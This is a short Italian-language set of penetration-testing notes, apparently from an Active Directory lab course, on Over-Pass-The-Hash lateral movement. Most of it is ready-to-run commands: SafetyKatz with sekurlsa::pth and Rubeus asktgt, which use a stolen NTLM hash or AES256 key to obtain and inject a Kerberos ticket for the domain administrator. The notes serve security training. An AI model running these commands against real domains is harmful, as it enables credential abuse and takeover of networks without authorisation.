# Lateral Movement - OverPass-The-Hash

* Over-Pass-The-Hash (OPTH) genera token sia dagli hash che dalle chiavi. A bisogno di elevation of privilege (Run as Administrator)

{% code fullWidth="true" %}
```powershell
SafetyKatz.exe "sekurlsa::pth /user:administrator /domain: dollarcorp.moneycorp.local /aes256:<aes256keys> /run:cmd.exe" "exit"
```
{% endcode %}

Il comando mostrato sopra inizializza un processo con un Logon Type 9 (lo stesso di runas `/netonly` )



* Over-Pass-The-Hash genera dei token a partire dagli hash o dalle chiavi
* Il comando seguente non richiede elevazione dei privilegi

```powershell
Rubeus.exe asktgt /user:administrator /rc4:<ntlmhash> /ptt
```

* Il comando seguente richiede l'elevazione dei privilegi

```powershell
Rubeus.exe asktgt /user:administrator /aes256:<aes256keys> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
